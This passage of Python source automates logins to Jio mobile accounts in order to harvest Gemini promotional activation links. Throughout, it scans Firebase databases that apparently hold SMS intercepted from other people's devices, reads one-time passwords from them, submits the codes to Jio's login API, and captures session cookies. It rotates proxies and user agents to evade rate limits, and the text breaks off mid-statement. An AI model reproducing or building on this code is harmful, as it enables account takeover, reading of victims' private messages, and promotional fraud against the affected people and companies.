                asyncio.create_task(cancel_order(order, instant=True))
            else:
                order["status"] = "cancelled"
                await emit_log(f"[{phone}] Browser error: {err_msg[:80]}", "error")
                # Immediate refund attempt but maybe not instant if we want to be safe
                asyncio.create_task(cancel_order(order, instant=True))

            await emit_order(order)
            if context:
                await context.close()
            return

    order["status"] = "waiting_otp"
    order_event(order, "Waiting for OTP from SMS provider...")
    await emit_order(order)

    max_attempts = 80  # Override to 4 minutes (80 attempts * 3s) for the Resend OTP flow

    # Poll for OTP
    otp_code = None
    start_time = time.time()
    resend_clicked = False

    for attempt in range(max_attempts):
        elapsed = time.time() - start_time
        if elapsed > 121 and page and not resend_clicked:
            resend_clicked = True
            try:
                order_event(order, "2 mins passed. Clicking Resend OTP on jio.com...")
                await emit_order(order)
                await emit_log(f"[{phone}] Clicking Resend OTP...", "warn")
                await page.locator('button[aria-label="Resend OTP"]').click(timeout=5000)
                await asyncio.sleep(1)
            except Exception as e:
                order_event(order, f"Could not click Resend OTP: {str(e)[:50]}")
                await emit_log(f"[{phone}] Failed to click Resend OTP", "error")

        # Graceful stop: removed early return so active Jio logins finish processing
        status = await get_otp_status(p_name, aid)
        if status.startswith("STATUS_OK:"):
            otp_text = status.split(":", 1)[1]
            match = re.search(r'\b(\d{6})\b', otp_text)
            otp_code = match.group(1) if match else otp_text.strip()
            state.stats["otp"] += 1
            record_analytics_event(p_name, "otp")
            await emit_stats()
            order["otp"] = otp_code
            order["status"] = "otp_received"
            order_event(order, f"OTP received: {otp_code}")
            await emit_order(order)
            await emit_log(f"✅ [{p_name}] {phone} OTP: {otp_code}", "success")
            break
        elif "CANCEL" in status:
            order["status"] = "cancelled"
            order_event(order, "Cancelled by SMS provider (no OTP delivered)")
            await emit_order(order)
            await emit_log(f"[{p_name}] {phone} cancelled by server", "error")
            if context:
                await context.close()
            return
        await asyncio.sleep(poll_interval)

    if not otp_code:
        order["status"] = "cancelling"
        order_event(order, "Timed out waiting for OTP. Cancelling number...")
        await emit_order(order)
        await emit_log(f"[{p_name}] {phone} no OTP received", "error")
        asyncio.create_task(cancel_order(order, instant=True))
        if context:
            await context.close()
        return

    # If we have browser, type OTP and submit
    if page:
        try:
            order["status"] = "logging_in"
            await emit_order(order)

            order_event(order, f"Typing OTP: {otp_code}")
            for i, digit in enumerate(otp_code[:6]):
                await page.locator(f'#basic-input-testInput-code-block-{i}').fill(digit)
                await asyncio.sleep(0.1)
            await asyncio.sleep(1)

            order_event(order, "Clicking Submit...")
            await page.locator('button:has-text("Submit")').click()
            await asyncio.sleep(3)

            state.stats["login"] += 1
            record_analytics_event(p_name, "login")
            await emit_stats()
            # --- AUTO EXTRACTION LOGIC ---
            order["status"] = "logging_in"
            order_event(order, "Looking for Gemini offer banner...")
            await emit_order(order)

            captured_url = []
            async def handle_route(route):
                req_url = route.request.url
                if "serviceactivation.google.com" in req_url or "accounts.google.com" in req_url or "oauth2" in req_url.lower():
                    captured_url.append(req_url)
                    try:
                        await route.abort()
                    except: pass
                else:
                    try:
                        await route.continue_()
                    except: pass

            await context.route("**/*", handle_route)

            try:
                banner_el = None
                el_id = None
                for _ in range(60):
                    gemini_el = await page.query_selector('#imageNotification')
                    if gemini_el:
                        banner_el = gemini_el
                        el_id = "imageNotification"
                        break
                    alt_el = await page.query_selector('section[class*="notificationContainer"]')
                    if alt_el:
                        text = await alt_el.inner_text()
                        if text and len(text.strip()) > 10:
                            banner_el = alt_el
                            break
                    await asyncio.sleep(1)

                if not banner_el:
                    raise Exception("No offer banner found after 60s")

                if el_id == "imageNotification":
                    order_event(order, "Found Gemini banner! Clicking...")
                    await emit_order(order)

                    # We expect the click to open a new tab/redirect
                    await page.click('#imageNotification')
                else:
                    # It's an alternative offer (YouTube Premium, Amazon Prime, etc.)
                    alt_els = await page.query_selector_all('section[class*="notificationContainer"]')
                    texts = []
                    for el in alt_els:
                        t = await el.inner_text()
                        if t and len(t.strip()) > 10:
                            texts.append(" | ".join([line.strip() for line in t.split('\n') if line.strip()]))
                    clean_text = " || ".join(texts) if texts else "Unknown Alternative Offer"

                    await emit_log(f"ℹ️ [{phone}] Alternative Offer Found: {clean_text}", "info")
                    order_event(order, f"Alternative Offer: {clean_text}")
                    await emit_order(order)

                    with open(os.path.join(DATA_DIR, "alternative_offers.csv"), "a", newline="") as f:
                        csv.writer(f).writerow([p_name, aid, phone, clean_text])

                    order["status"] = "cancelled"
                    await emit_order(order)
                    if context:
                        await context.close()
                    return

                # Wait for the redirect to be caught
                for _ in range(15):
                    if captured_url:
                        break
                    await asyncio.sleep(1)

                if captured_url:
                    # Prioritize serviceactivation.google.com if found, otherwise use the first caught URL
                    target_link = next((url for url in captured_url if "serviceactivation.google.com" in url), captured_url[0])

                    # Persist to config["saved_links"]
                    _sl = config.get("saved_links", [])
                    if target_link not in _sl:
                        _sl.append(target_link)
                        config["saved_links"] = _sl
                        save_config(config)

                    # Save to links.txt as backup
                    try:
                        with open(os.path.join(DATA_DIR, "links.txt"), "a") as f:
                            f.write(f"{phone} | {target_link}\n")
                    except Exception:
                        pass

                    order["status"] = "logged_in"
                    order_event(order, "✅ Link extracted & saved!")
                    await emit_order(order)
                    await emit_log(f"🎉 [{phone}] Gemini Link Saved!", "success")
                    await asyncio.sleep(2)

                    # Successfully done, close browser
                    await context.close()
                    order["_context"] = None
                    return
                else:
                    order_event(order, "⚠️ Clicked banner but redirect not caught.")
            except Exception as e:
                order_event(order, f"⚠️ Banner not found or error: {str(e)[:40]}")

            # Fallback to manual mode if automation failed or timed out
            order["status"] = "extract_link"
            order_event(order, "✅ Login successful! Banner not found, do manual extraction.")
            await emit_order(order)
            await emit_log(f"🎉 [{p_name}] {phone} LOGGED IN! Extract link now.", "success")

            # 20-minute timeout for manual extraction
            await asyncio.sleep(1200)
            if order.get("status") == "extract_link":
                order["status"] = "completed"
                order_event(order, "⏰ 20 minutes passed. Closing tab to free RAM.")
                await emit_order(order)
                await emit_log(f"🧹 [{phone}] Auto-closed after 20 mins of inactivity", "warn")
                if context:
                    try:
                        await context.close()
                    except:
                        pass
                if order["id"] in state.orders:
                    del state.orders[order["id"]]
                    await sio.emit("number_remove", {"id": order["id"]})

        except Exception as e:
            order["status"] = "cancelled"
            order_event(order, f"Browser error typing OTP: {str(e)}")
            await emit_order(order)
            await emit_log(f"[{phone}] Browser error: {str(e)[:80]}", "error")
            await context.close()

async def cancel_order(order, instant=False):
    order["status"] = "cancelling"
    if instant:
        cancel_wait = 0
    else:
        cancel_wait = config.get("timing", {}).get("cancel_wait_seconds", 120)

        # OTPDoctor requires 5 minutes (300 seconds) before cancellation
        if order["provider"] == "OTPDoctor":
            cancel_wait = max(cancel_wait, 300)

    if cancel_wait > 0:
        order_event(order, f"Waiting {cancel_wait}s before cancelling...")
        await emit_order(order)
        await asyncio.sleep(cancel_wait)
    else:
        order_event(order, "Cancelling number immediately...")
        await emit_order(order)

    while True:
        status = await cancel_api_number(order["provider"], order["aid"])
        if "EARLY_CANCEL_DENIED" in status:
            order_event(order, "Early cancel denied, retrying in 10s...")
            await asyncio.sleep(10)
        elif "CANCEL" in status or "ACTIVATION" in status:
            order["status"] = "cancelled"
            order_event(order, "Successfully cancelled & refunded")
            await emit_order(order)
            await emit_log(f"[{order['phone']}] Cancelled & refunded", "info")
            await asyncio.sleep(5)
            if order["id"] in state.orders:
                del state.orders[order["id"]]
                await sio.emit("number_remove", {"id": order["id"]})
            break
        else:
            order["status"] = "cancelled"
            order_event(order, f"Cancel response: {status}")
            await emit_order(order)
            break

# ─── Firebase Direct Architecture ────────────────────────────────────────────
SUCCESS_CSV = os.path.join(DATA_DIR, "extracted_links.csv")
FAILED_CSV = os.path.join(DATA_DIR, "failed_links.csv")

def init_csvs():
    if not os.path.exists(SUCCESS_CSV):
        with open(SUCCESS_CSV, "w", newline="") as f:
            csv.writer(f).writerow(["Firebase URL", "Device ID", "Phone Number", "Extracted Link", "Status (Online/Offline)", "OTP Wait Time (s)"])
    if not os.path.exists(FAILED_CSV):
        with open(FAILED_CSV, "w", newline="") as f:
            csv.writer(f).writerow(["Firebase URL", "Device ID", "Phone Number", "Failed Step", "Status (Online/Offline)", "OTP Wait Time (s)"])

# Regional digit maps for normalization
REGIONAL_DIGITS = str.maketrans(
    "०१२३४५६७८९"  # Hindi/Devanagari
    "০১২৩৪৫৬৭৮৯"  # Bengali
    "੦੧੨੩੪੫੬੭੮੯"  # Punjabi
    "૦૧૨૩૪૫૬૭૮૯"  # Gujarati
    "୦୧୨୩୪୫୬୭୮୯"  # Odia
    "౦౧౨౩౪౫౬౭౮౯"  # Telugu
    "೦೧೨೩೪೫೬೭೮೯"  # Kannada
    "൦൧൨൩൪൫൬൭൮൯"  # Malayalam
    "௦௧௨௩௪௫௬௭௮௯",  # Tamil
    "0123456789" * 9
)

def normalize_digits(text):
    """Convert regional script digits to Latin digits."""
    return text.translate(REGIONAL_DIGITS)

def extract_phone_from_text(text):
    """Extract any 10-digit Indian mobile number, normalizing regional digits."""
    normalized = normalize_digits(text)
    match = re.search(r'(?<!\d)([6-9]\d{9})(?!\d)', normalized)
    return match.group(1) if match else None

def is_jio_message(msg_data):
    """Check if a message is Jio-related by checking both message body and sender."""
    text = msg_data.get("message", "").lower()
    sender = msg_data.get("sender", "").lower()
    return "jio" in text or "jio" in sender

def parse_firebase_datetime(dt_str):
    """Parse Firebase dateTime like '22-07-2025 | 01:12 pm' to a timestamp."""
    try:
        from datetime import datetime
        clean = dt_str.replace(" | ", " ").strip()
        for fmt in ["%d-%m-%Y %I:%M %p", "%d-%m-%Y %I:%M:%S %p", "%d-%m-%Y %H:%M"]:
            try:
                return datetime.strptime(clean, fmt).timestamp()
            except ValueError:
                continue
    except Exception:
        pass
    return 0

def clean_firebase_url(url):
    """Extract raw Firebase URL from base64 Netlify strings if present."""
    url = url.strip()

    # Strip any leading numbers and dashes like "1:-"
    url = re.sub(r'^\d+:-', '', url)

    if "badxweb.vercel.app/?s=" in url or "?s=" in url:
        try:
            parsed = urlparse(url)
            s_param = parse_qs(parsed.query).get('s', [None])[0]
            if not s_param and "badxweb.vercel.app/?s=" in url:
                s_param = url.split("badxweb.vercel.app/?s=")[1].strip()

            if s_param:
                # Add padding to base64 string
                s_param += "=" * ((4 - len(s_param) % 4) % 4)

                decoded = base64.b64decode(s_param).decode('utf-8')
                if "|||" in decoded:
                    return decoded.split("|||")[0].strip()
                elif decoded.startswith("http"):
                    return decoded.strip()
        except Exception:
            pass
    return url.rstrip('/')

# Module-level Firebase auth map — populated by fetch_initial_mapping, used by all Firebase functions
_url_key_map: dict = {}

def fb_url_with_auth(base_url: str, path: str, extra_params: str = "") -> str:
    """Build Firebase request URL, appending ?auth=KEY if key exists for this URL."""
    key = _url_key_map.get(base_url, "")
    auth_param = f"auth={key}" if key else ""
    if extra_params and auth_param:
        return f"{base_url}/{path}?{extra_params}&{auth_param}"
    elif auth_param:
        return f"{base_url}/{path}?{auth_param}"
    elif extra_params:
        return f"{base_url}/{path}?{extra_params}"
    else:
        return f"{base_url}/{path}"

async def fetch_initial_mapping(scan_mode="deep"):
    scan_labels = {"normal": "ONLINE ONLY", "deep": "DEEP SCAN (5d active)", "deepest": "DEEPEST SCAN (20d active)"}
    scan_label = scan_labels.get(scan_mode, "DEEP SCAN")
    await emit_log(f"Fetching Firebase clients ({scan_label})...", "info")
    device_map = {}

    # Build _url_key_map: {clean_url: auth_key_or_empty} — module-level for cross-function access
    global _url_key_map
    _url_key_map = {}
    # First load from firebase_dbs (URL + Key pairs from Settings UI)
    for db in config.get("firebase_dbs", []):
        raw_url = (db.get("url") or "").strip()
        key = (db.get("key") or "").strip()
        if raw_url:
            cleaned = clean_firebase_url(raw_url)
            if ".firebaseio.com" in cleaned:
                _url_key_map[cleaned] = key
    # Also load from firebase_urls (env var / legacy), no key
    for raw_url in config.get("firebase_urls", []):
        cleaned = clean_firebase_url(raw_url.strip())
        if ".firebaseio.com" in cleaned and cleaned not in _url_key_map:
            _url_key_map[cleaned] = ""

    urls = list(_url_key_map.keys())

    if not urls:
        await emit_log("No valid Firebase URLs configured!", "error")
        return device_map

    # fb_url_with_auth is now a module-level function above

    # Cutoff in milliseconds (Firebase message keys are ms timestamps)
    cutoff_days = 20 if scan_mode == "deepest" else 5
    cutoff_ms = int((time.time() - (cutoff_days * 86400)) * 1000)

    async def scan_single_fb(fb_url):
        """Scan a single Firebase URL and return its device mappings."""
        local_map = {}
        try:
            # 1. Fetch the online status of clients
            online_devices = set()
            for attempt in range(3):
                try:
                    async with state.http_session.get(fb_url_with_auth(fb_url, "clients.json"), timeout=90) as resp:
                        if resp.status == 200:
                            clients_data = await resp.json()
                            if clients_data:
                                for dev_id, dev_info in clients_data.items():
                                    if isinstance(dev_info, dict) and dev_info.get("status") is True:
                                        online_devices.add(dev_id)
                            break
                except Exception as req_err:
                    if attempt == 2: raise req_err
                    await asyncio.sleep(2)

            # 2. Fetch the latest messages for each online device
            # Instead of downloading the massive messages.json (which causes timeouts),
            # we query Firebase for only the last 20 messages for EACH online device.
            online_count = 0
            offline_count = 0
            offline_alive = 0
            offline_dormant = 0
            jio_tagged = 0
            fallback_found = 0

            if scan_mode == "normal":
                # NORMAL: Only online devices
                for device_id in list(online_devices):
                    for attempt in range(3):
                        try:
                            # Use Firebase query params to fetch only the last 20 messages for this specific device
                            query_url = fb_url_with_auth(fb_url, f"messages/{device_id}.json", "orderBy=\"$key\"&limitToLast=20")
                            async with state.http_session.get(query_url, timeout=15) as resp:
                                if resp.status == 200:
                                    msgs = await resp.json()
                                    if msgs and isinstance(msgs, dict):
                                        online_count += 1
                                        sorted_msgs = sorted(msgs.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
                                        found = False

                                        # Pass 1: Look for Jio messages
                                        for msg_id, msg_data in sorted_msgs:
                                            if not isinstance(msg_data, dict): continue
                                            if is_jio_message(msg_data):
                                                phone = extract_phone_from_text(msg_data.get("message", ""))
                                                if phone:
                                                    local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online", "cached_keys": set() }
                                                    jio_tagged += 1
                                                    found = True
                                                    break

                                        # Pass 2: Fallback
                                        if not found:
                                            for msg_id, msg_data in sorted_msgs:
                                                if not isinstance(msg_data, dict): continue
                                                phone = extract_phone_from_text(msg_data.get("message", ""))
                                                if phone:
                                                    local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online", "cached_keys": set() }
                                                    fallback_found += 1
                                                    break
                                    break
                        except Exception as req_err:
                            if attempt == 2: pass
                            await asyncio.sleep(1)
            else:
                # DEEP or DEEPEST — Lightweight approach (no massive download!)
                # Step 1: Get all device IDs via shallow query (~0.3-2s, tiny payload)
                all_device_ids = set()
                for attempt in range(3):
                    try:
                        async with state.http_session.get(fb_url_with_auth(fb_url, "messages.json", "shallow=true"), timeout=30) as resp:
                            if resp.status == 200:
                                shallow = await resp.json()
                                if shallow and isinstance(shallow, dict):
                                    all_device_ids = set(shallow.keys())
                                break
                    except Exception as req_err:
                        if attempt == 2: raise req_err
                        await asyncio.sleep(2)

                if not all_device_ids:
                    return local_map

                # Step 2: For offline devices, check if they're "alive"
                offline_device_ids = all_device_ids - online_devices
                alive_device_ids = set()
                dormant_device_ids = set()

                # Check offline devices in parallel batches (20 at a time)
                device_sem = asyncio.Semaphore(20)

                # DEEP or DEEPEST: Only include offline devices active in last N days
                async def check_device_alive(device_id):
                    async with device_sem:
                        try:
                            async with state.http_session.get(
                                fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=10
                            ) as resp:
                                if resp.status == 200:
                                    keys_data = await resp.json()
                                    if keys_data and isinstance(keys_data, dict):
                                        latest_key = max((int(k) for k in keys_data.keys() if str(k).isdigit()), default=0)
                                        if latest_key >= cutoff_ms:
                                            return device_id  # Alive!
                        except Exception:
                            pass
                        return None

                alive_results = await asyncio.gather(*[check_device_alive(did) for did in offline_device_ids])
                alive_device_ids = {did for did in alive_results if did is not None}
                offline_dormant = len(offline_device_ids) - len(alive_device_ids)
                offline_alive = len(alive_device_ids)

                offline_count = len(offline_device_ids)

                # Step 3: Fetch last 20 messages for online + target offline devices
                target_devices = list(online_devices | alive_device_ids)

                async def fetch_device_msgs(device_id):
                    async with device_sem:
                        is_online = device_id in online_devices
                        try:
                            query_url = fb_url_with_auth(fb_url, f"messages/{device_id}.json", "orderBy=\"$key\"&limitToLast=20")
                            async with state.http_session.get(query_url, timeout=15) as resp:
                                if resp.status == 200:
                                    msgs = await resp.json()
                                    if msgs and isinstance(msgs, dict):
                                        if is_online:
                                            online_count_box[0] += 1

                                        sorted_msgs = sorted(msgs.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
                                        if not sorted_msgs:
                                            return

                                        found = False
                                        for msg_id, msg_data in sorted_msgs:
                                            if not isinstance(msg_data, dict): continue
                                            if is_jio_message(msg_data):
                                                phone = extract_phone_from_text(msg_data.get("message", ""))
                                                if phone:
                                                    local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online" if is_online else "offline", "cached_keys": set() }
                                                    jio_tagged_box[0] += 1
                                                    found = True
                                                    break

                                        if not found:
                                            for msg_id, msg_data in sorted_msgs:
                                                if not isinstance(msg_data, dict): continue
                                                phone = extract_phone_from_text(msg_data.get("message", ""))
                                                if phone:
                                                    local_map[device_id] = { "phone": phone, "url": fb_url, "status": "online" if is_online else "offline", "cached_keys": set() }
                                                    fallback_box[0] += 1
                                                    break
                        except Exception:
                            pass

                # Use mutable boxes for counters (closures can't reassign nonlocal in gather)
                online_count_box = [0]
                jio_tagged_box = [0]
                fallback_box = [0]

                await asyncio.gather(*[fetch_device_msgs(did) for did in target_devices])

                online_count = online_count_box[0]
                jio_tagged = jio_tagged_box[0]
                fallback_found = fallback_box[0]

            total_found = online_count + offline_count
            if scan_mode == "deepest":
                deep_label = f", Offline-Alive (20d): {offline_alive}, Dormant: {offline_dormant}"
            elif scan_mode == "deep":
                deep_label = f", Offline-Alive (5d): {offline_alive}, Dormant: {offline_dormant}"
            else:
                deep_label = ""
            db_name = fb_url.split('/')[2].split('.')[0]
            if total_found > 0 or jio_tagged > 0 or fallback_found > 0:
                await emit_log(f"[{db_name}] Online: {online_count}{deep_label} | Jio-tagged: {jio_tagged}, Fallback: {fallback_found}", "info")
            else:
                await emit_log(f"[{db_name}] Empty (0 devices)", "debug")
        except asyncio.TimeoutError:
            await emit_log(f"Error fetching from {fb_url}: Connection timed out (database might be too large)", "error")
        except Exception as e:
            err_msg = str(e) or type(e).__name__
            await emit_log(f"Error fetching from {fb_url}: {err_msg}", "error")
        return local_map

    # Scan ALL Firebase URLs in parallel, but limited to 10 at a time to prevent choking
    await emit_log(f"⚡ Scanning {len(urls)} Firebase databases in parallel (Max 10 at once)...", "info")

    sem = asyncio.Semaphore(10)

    async def bounded_scan(fb_url):
        async with sem:
            return await scan_single_fb(fb_url)

    results = await asyncio.gather(*[bounded_scan(fb_url) for fb_url in urls])

    for local_map in results:
        device_map.update(local_map)

    mode_labels = {"normal": "ONLINE", "deep": "ONLINE + recently-active OFFLINE (5d)", "deepest": "ONLINE + recently-active OFFLINE (20d)"}
    mode_label = mode_labels.get(scan_mode, "ONLINE")
    await emit_log(f"Mapped {len(device_map)} phone numbers from {mode_label} Firebase devices!", "success")
    return device_map


async def poll_for_otp(fb_url, device_id, known_msg_keys, timeout=45, poll_interval=2.5):
    """Poll Firebase directly for new OTP messages on a specific device.

    This replaces the unreliable SSE approach. After clicking 'Generate OTP',
    we poll /messages/{device_id}.json every 1.2s and look for any NEW
    message (not in known_msg_keys) containing a 6-digit code.

    Returns the OTP string or raises TimeoutError.
    """
    deadline = asyncio.get_event_loop().time() + timeout

    async def fetch_single_msg(key):
        """Fetch a single message payload and return (key, data) or None."""
        try:
            async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}/{key}.json"), timeout=10) as msg_resp:
                if msg_resp.status != 200:
                    return None
                msg_data = await msg_resp.json()
                if not isinstance(msg_data, dict):
                    return None
                return (key, msg_data)
        except Exception:
            return None

    while asyncio.get_event_loop().time() < deadline:
        try:
            # Fetch just the keys (shallow=true) to find new messages
            async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=10) as resp:
                if resp.status != 200:
                    await asyncio.sleep(poll_interval)
                    continue
                shallow_data = await resp.json()
                if not shallow_data or not isinstance(shallow_data, dict):
                    await asyncio.sleep(poll_interval)
                    continue

                # Find new message keys
                new_keys = [k for k in shallow_data.keys() if k not in known_msg_keys]
                if not new_keys:
                    await asyncio.sleep(poll_interval)
                    continue

                # Fetch all new message payloads concurrently
                results = await asyncio.gather(*[fetch_single_msg(key) for key in new_keys])

                successfully_checked = set()
                for result in results:
                    if result is None:
                        # Don't add to known_keys - retry on next cycle
                        continue
                    key, msg_data = result

                    # Check multiple possible field names for SMS text
                    text = ""
                    for field in ("message", "body", "text", "content", "smsBody"):
                        val = msg_data.get(field, "")
                        if val and isinstance(val, str):
                            text = val
                            break
                    # Fallback: scan entire JSON string
                    if not text:
                        text = str(msg_data)

                    normalized = normalize_digits(text)
                    otp_match = re.search(r'(?<!\d)(\d{6})(?!\d)', normalized)
                    if otp_match:
                        otp = otp_match.group(1)
                        await emit_log(f"🔔 POLL [{device_id[:8]}] OTP detected: {otp} (msg {key})", "success")
                        return otp

                    successfully_checked.add(key)

                # Only mark successfully-checked non-OTP messages as known
                known_msg_keys.update(successfully_checked)

        except Exception as e:
            await emit_log(f"Poll [{device_id[:8]}] error: {e}", "warning")

        await asyncio.sleep(poll_interval)

    raise asyncio.TimeoutError(f"No OTP found after {timeout}s of polling")


async def get_device_message_keys(fb_url, device_id):
    """Get the current set of message keys for a device (snapshot before OTP request)."""
    try:
        async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=15) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict):
                    return set(data.keys())
    except Exception:
        pass
    return set()

class RetryableJioError(Exception):
    """Raised when jio.com shows 'Something went wrong' — device should be retried after a delay."""
    pass

class ProxyError(Exception):
    """Raised when a proxy fails (502, 503, connection error). Triggers immediate retry with a different proxy."""
    pass

# Google domains that appear in the Gemini offer redirect chain
GOOGLE_LINK_PATTERNS = ("serviceactivation.google.com", "services.google.com/fb/gem", "accounts.google.com")

def is_google_link(url):
    """Check if a URL is a Gemini activation link from any Google domain."""
    if not url:
        return False
    return any(p in url for p in GOOGLE_LINK_PATTERNS)

def find_google_link_in_text(text):
    """Search text/HTML for any Google activation link."""
    import re
    for pattern in GOOGLE_LINK_PATTERNS:
        escaped = pattern.replace(".", r"\.")
        match = re.search(rf'https?://{escaped}[^\s"\'<>]*', text)
        if match:
            return match.group(0)
    return None


async def process_firebase_number(device_id, phone, fb_url, speed_delay, attempt=1, online_status="unknown", cached_msg_keys=None):
    used_file = os.path.join(DATA_DIR, "used_firebase_devices.txt")
    otp_wait_time = "N/A"
    slot_released = False

    try:
        max_attempts = 3
        order_id = str(uuid.uuid4())[:8]
        clean_phone = phone[2:] if (phone.startswith("91") and len(phone) > 10) else phone
        attempt_label = f" (attempt {attempt}/{max_attempts})" if attempt > 1 else ""
        order = {
            "id": order_id, "aid": device_id, "phone": "+91" + clean_phone, "provider": "FirebaseDirect",
            "status": "checking_carrier", "carrier": "Jio", "otp": None,
            "timestamp": time.time(), "events": []
        }

        order_event(order, f"Discovered on Firebase Device: {device_id}{attempt_label}")
        await emit_order(order)

        if attempt == 1:
            state.stats["fetched"] += 1
            record_analytics_event("FirebaseDirect", "fetched")
            state.stats["jio"] += 1
            record_analytics_event("FirebaseDirect", "jio")
            await emit_stats()

        order["status"] = "waiting_otp"
        await emit_order(order)

        # --- API LOGIC START ---
        _ua = get_random_ua()
        _is_mobile = "iPhone" in _ua or "Android" in _ua
        headers = {
            "user-agent": _ua,
            "sec-ch-ua-mobile": "?1" if _is_mobile else "?0",
            "sec-ch-ua-platform": '"iOS"' if _is_mobile else '"Windows"',
            "referer": "https://www.jio.com/selfcare/login/",
            "origin": "https://www.jio.com",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-IN,en;q=0.9,hi;q=0.8",
        }

        proxy = get_random_proxy()
        # On retries, try to get a different proxy if possible
        if attempt > 1:
            proxies_list = config.get("proxies", [])
            if len(proxies_list) > 1:
                for _ in range(5):
                    new_p = random.choice(proxies_list)
                    if new_p != proxy:
                        proxy = new_p
                        break
        proxy_label = f" (via proxy)" if proxy else " (no proxy)"
        order_event(order, f"Sending OTP via direct API{proxy_label}...{attempt_label}")
        await emit_order(order)

        cookie_jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(limit=5, enable_cleanup_closed=True)
        async with aiohttp.ClientSession(cookie_jar=cookie_jar, headers=headers, connector=connector) as session:

            # 1. SEND OTP
            send_otp_url = "https://www.jio.com/api/jio-login-service/login/sendOtp"
            payload = {"mobileNumber": clean_phone, "loginFlowType": "MOBILE", "alternateNumber": ""}

            # Use pre-cached keys as base, then do a fast delta to catch anything new
            if cached_msg_keys is not None:
                known_msg_keys = set(cached_msg_keys)
                # Quick delta: shallow fetch just the keys (no message bodies, ~200ms)
                try:
                    async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=8) as delta_resp:
                        if delta_resp.status == 200:
                            delta_data = await delta_resp.json()
                            if delta_data and isinstance(delta_data, dict):
                                new_since_cache = set(delta_data.keys()) - known_msg_keys
                                if new_since_cache:
                                    known_msg_keys.update(new_since_cache)
                                    await emit_log(f"[{phone}] Cache + {len(new_since_cache)} new msgs = {len(known_msg_keys)} total for {device_id[:8]}", "info")
                                else:
                                    await emit_log(f"[{phone}] Cache hit: {len(known_msg_keys)} msgs for {device_id[:8]} (no new)", "info")
                except Exception:
                    await emit_log(f"[{phone}] Delta failed, using cache: {len(known_msg_keys)} msgs for {device_id[:8]}", "info")
            else:
                known_msg_keys = await get_device_message_keys(fb_url, device_id)
                await emit_log(f"[{phone}] Fresh snapshot: {len(known_msg_keys)} msgs for {device_id[:8]}", "info")

            try:
                async with session.post(send_otp_url, json=payload, proxy=proxy, timeout=15) as resp:
                    if resp.status == 429:
                        raise RetryableJioError("Jio IP Rate Limited (HTTP 429)")
                    elif resp.status == 400:
                        raise Exception("Non-Jio or Invalid Number (HTTP 400)")
                    elif resp.status in (502, 503, 504):
                        raise ProxyError(f"Proxy returned {resp.status}")
                    elif resp.status != 200:
                        raise RetryableJioError(f"sendOtp failed with status {resp.status}")
            except (aiohttp.ClientConnectorError, aiohttp.ClientOSError, aiohttp.ServerDisconnectedError,
                    aiohttp.ClientResponseError, aiohttp.ClientHttpProxyError,
                    ConnectionError, OSError) as conn_err:
                if proxy:
                    raise ProxyError(f"Proxy error: {conn_err}")
                raise

            await emit_log(f"[{phone}] Generated OTP on jio.com via API", "info")
            order_event(order, "Polling Firebase for OTP...")
            await emit_order(order)

            # 2. WAIT FOR OTP
            poll_start = time.time()
            cancel_wait = config.get("timing", {}).get("cancel_wait_seconds", 120)

            async def release_slot_after_delay():
                nonlocal slot_released
                await asyncio.sleep(7)
                if not slot_released:
                    slot_released = True
                    async with _jio_lock():
                        state.jio_count = max(0, state.jio_count - 1)
                    await emit_log(f"⏩ [{phone}] OTP taking >7s — releasing slot for next account", "info")

            slot_timer = asyncio.create_task(release_slot_after_delay())

            try:
                otp_code = await poll_for_otp(fb_url, device_id, known_msg_keys, timeout=cancel_wait)
                otp_wait_time = round(time.time() - poll_start, 1)
            except asyncio.TimeoutError:
                if slot_timer: slot_timer.cancel()
                raise Exception("Timed out waiting for Firebase OTP")

            if slot_timer: slot_timer.cancel()
            if not slot_released:
                slot_released = True
                async with _jio_lock():
                    state.jio_count = max(0, state.jio_count - 1)
                await emit_log(f"⏩ [{phone}] OTP received fast (<7s) — releasing slot now", "info")

            order["otp"] = otp_code
            order["status"] = "otp_received"
            order_event(order, f"OTP received: {otp_code} ({otp_wait_time}s)")
            await emit_order(order)
            await emit_log(f"✅ Firebase OTP for {phone}: {otp_code} (waited {otp_wait_time}s)", "success")

            if attempt == 1:
                state.stats["otp_times"].append(otp_wait_time)
                state.stats["otp"] += 1
                record_analytics_event("FirebaseDirect", "otp")
                await emit_stats()

            # 3. VALIDATE OTP
            order["status"] = "logging_in"
            order_event(order, "Validating OTP via API...")
            await emit_order(order)
            await asyncio.sleep(0.5 * speed_delay)

            val_url = "https://www.jio.com/api/jio-login-service/login/validateOtp"
            val_payload = {"otp": str(otp_code)}
            raw_cookies = {}  # Will hold ALL cookies from Set-Cookie headers
            try:
                async with session.post(val_url, json=val_payload, proxy=proxy, timeout=15) as val_resp:
                    if val_resp.status != 200:
                        text = await val_resp.text()
                        if "invalid" in text.lower() or val_resp.status == 400:
                            raise RetryableJioError("Invalid OTP returned by server")
                        raise RetryableJioError(f"validateOtp failed with status {val_resp.status}")

                    # Extract ALL cookies from raw Set-Cookie headers
                    # aiohttp's cookie_jar drops HttpOnly cookies that get deleted then re-set
                    for header_name, header_val in val_resp.raw_headers:
                        if header_name.lower() == b'set-cookie':
                            cookie_str = header_val.decode('utf-8', errors='replace')
                            name_val = cookie_str.split(';')[0].strip()
                            if '=' in name_val:
                                cname = name_val.split('=', 1)[0]
                                cval = name_val.split('=', 1)[1]
                                # Skip deletion cookies (Max-Age=0 or empty value)
                                if cval and cval != "''" and 'Max-Age=0' not in cookie_str:
                                    raw_cookies[cname] = cval

                    # Also grab any cookies from the jar that we missed
                    for c in session.cookie_jar:
                        if c.key not in raw_cookies:
                            raw_cookies[c.key] = c.value

            except (aiohttp.ClientConnectorError, aiohttp.ClientOSError, aiohttp.ServerDisconnectedError,
